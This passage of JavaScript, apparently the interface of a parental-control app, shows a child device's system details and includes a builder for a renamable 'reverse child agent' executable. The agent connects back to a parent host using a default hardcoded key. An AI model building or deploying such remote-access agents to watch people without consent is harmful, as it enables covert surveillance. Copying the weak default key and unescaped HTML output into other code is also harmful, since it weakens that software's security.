    var isOnline = selectedDev && selectedDev.is_online;
    var fields = [
        { label: 'Device ID',        value: selectedDev ? selectedDev.id : '—', icon: 'fa-fingerprint'  },
        { label: 'Child Profile',    value: selectedDev ? (selectedDev.custom_name || 'Not set') : '—', icon: 'fa-user' },
        { label: 'Status',           value: isOnline ? 'Online (Connected)' : 'Offline (Cached)', icon: 'fa-signal' },
        { label: 'Hostname',         value: info.hostname  || '—', icon: 'fa-server'        },
        { label: 'User Account',     value: info.username  || '—', icon: 'fa-id-badge'      },
        { label: 'Operating System',  value: info.os        || '—', icon: 'fa-windows'       },
        { label: 'Processor (CPU)',   value: info.cpu       || '—', icon: 'fa-microchip'     },
        { label: 'Total RAM',         value: info.ram_total || '—', icon: 'fa-memory'        },
        { label: 'Available RAM',     value: info.ram_free  || '—', icon: 'fa-memory'        },
        { label: 'Last Boot Time',    value: info.boot_time || '—', icon: 'fa-clock'         },
        { label: 'IP Address',        value: selectedDev ? selectedDev.ip : '—', icon: 'fa-network-wired' }
    ];
    grid.empty();
    fields.forEach(function(f) {
        grid.append(
            '<div class="si-card">' +
                '<div class="si-label"><i class="fa-solid ' + f.icon + '"></i>' + f.label + '</div>' +
                '<div class="si-value">' + f.value + '</div>' +
            '</div>'
        );
    });
}

function doSysinfo(forceRefresh) {
    if (!selectedDev) return;
    var devId = selectedDev.id || ('KC-' + selectedDev.ip);
    var cache = getDevCache(devId);

    if (!forceRefresh && cache.sysinfo) {
        renderSysinfo(cache.sysinfo);
        return;
    }

    if (!selectedDev.is_online) {
        toast('Cannot refresh: Child device is offline.', 'warning');
        return;
    }

    var grid = $('#sysinfoGrid');
    grid.html('<div class="empty-state" style="grid-column:1/-1; padding:30px;"><span class="spin"></span> Loading...</div>');
    sendCmd('SYSINFO', function(raw) {
        if (!raw.startsWith('SYSINFO:')) { grid.html('<div class="empty-state" style="grid-column:1/-1;">Failed to parse response.</div>'); return; }
        var info = {};
        try { info = JSON.parse(raw.substring(8)); } catch(e) { grid.html('<div>Parse error.</div>'); return; }
        cache.sysinfo = info; // Save to Cache
        window.djazair.invoke('saveDiskCache', { id: devId, data: { procs: cache.procs, sysinfo: cache.sysinfo } });
        renderSysinfo(info);
        toast('System info updated.', 'success');
    });
}

// ═════════════════════════════════════════════════════════════════════════════
// Settings Modal
// ═════════════════════════════════════════════════════════════════════════════

function applyAutoScanInterval(seconds) {
    if (autoScanTimer) clearInterval(autoScanTimer);
    if (seconds > 0) {
        autoScanTimer = setInterval(function() {
            performScan(false);
        }, seconds * 1000);
    }
}

function openSettingsModal() {
    window.djazair.invoke('getSettings').then(function(res) {
        if (res && res.ok && res.data) {
            currentAppConfig = res.data;
            $('#cfgScanInterval').val(currentAppConfig.auto_scan_interval !== undefined ? currentAppConfig.auto_scan_interval : 5);
        }
        new bootstrap.Modal('#settingsModal').show();
    });
}

function saveSettings() {
    var newCfg = {
        auto_scan_interval: parseInt($('#cfgScanInterval').val(), 10),
    };

    window.djazair.invoke('saveSettings', newCfg).then(function(res) {
        if (res && res.ok) {
            currentAppConfig = newCfg;
            applyAutoScanInterval(newCfg.auto_scan_interval);
            bootstrap.Modal.getInstance('#settingsModal').hide();
            toast('Settings saved successfully!', 'success');
        } else {
            toast('Failed to save settings.', 'danger');
        }
    });
}

// ═════════════════════════════════════════════════════════════════════════════
// Export Child Agent Modal & Logic
// ═════════════════════════════════════════════════════════════════════════════

var lastExportFolder = '';

function openExportModal() {
    $('#exportStatusBox').hide();
    $('#openExpFolderBtn').hide();
    $('#btnBuildAgent').prop('disabled', false).html('<i class="fa-solid fa-hammer"></i> Build Executable (.exe)');
    
    // Auto-detect Parent's local LAN IP to prefill the input
    window.djazair.invoke('getLocalServerIp').then(function(ip) {
        if (ip && typeof ip === 'string' && ip !== '127.0.0.1') {
            $('#expParentHost').val(ip);
        }
    });

    new bootstrap.Modal('#exportModal').show();
}

function doBrowseExportFolder() {
    window.djazair.invoke('selectExportFolder').then(function(folder) {
        if (folder && typeof folder === 'string' && folder !== '') {
            $('#expExportFolder').val(folder);
        }
    });
}

function doExportChildAgent() {
    var appName = $('#expAppName').val().trim() || 'KidsControlAgent.exe';
    var parentHost = $('#expParentHost').val().trim() || '127.0.0.1';
    var parentPort = parseInt($('#expParentPort').val(), 10) || 9999;
    var secretKey = $('#expSecretKey').val().trim() || 'KIDS_CTRL_2026';
    var consoleMode = $('#expConsoleMode').val() === 'true';
    var exportFolder = $('#expExportFolder').val().trim() || 'exports';

    var btn = $('#btnBuildAgent');
    var statusBox = $('#exportStatusBox');
    var statusMsg = $('#exportStatusMsg');

    btn.prop('disabled', true).html('<span class="spin"></span> Building standalone .exe...');
    statusBox.show().css({ 'border-color': 'var(--accent)', 'color': 'var(--accent)' });
    statusMsg.html('<i class="fa-solid fa-gear fa-spin"></i> Packaging reverse child agent with dpack... Please wait.');

    var payload = {
        appName: appName,
        parentHost: parentHost,
        parentPort: parentPort,
        secretKey: secretKey,
        consoleMode: consoleMode,
        exportFolder: exportFolder
    };

    window.djazair.invoke('exportChildAgent', payload).then(function(res) {
        btn.prop('disabled', false).html('<i class="fa-solid fa-hammer"></i> Build Executable (.exe)');
        var data = extractData(res);
        if (data && data.ok) {
            lastExportFolder = data.folder || exportFolder;
            statusBox.css({ 'border-color': 'var(--success)', 'color': 'var(--success)' });
            statusMsg.html(
                '<i class="fa-solid fa-circle-check"></i> <strong>' + data.filename + '</strong> built successfully! (' + data.size + ')<br>' +
                '<span style="color:var(--text-muted); font-size:11px;">Saved to: ' + data.path + '</span>'
            );
            $('#openExpFolderBtn').show();
            toast('Child agent built successfully: ' + data.filename, 'success');
        } else {
            var errMsg = (data && data.error) ? data.error : 'Unknown error during build.';
            statusBox.css({ 'border-color': 'var(--danger)', 'color': 'var(--danger)' });
            statusMsg.html('<i class="fa-solid fa-circle-xmark"></i> ' + errMsg);
            toast('Failed to build child agent: ' + errMsg, 'danger');
        }
    });
}

function doOpenExportFolder() {
    window.djazair.invoke('openExportFolder', lastExportFolder);
}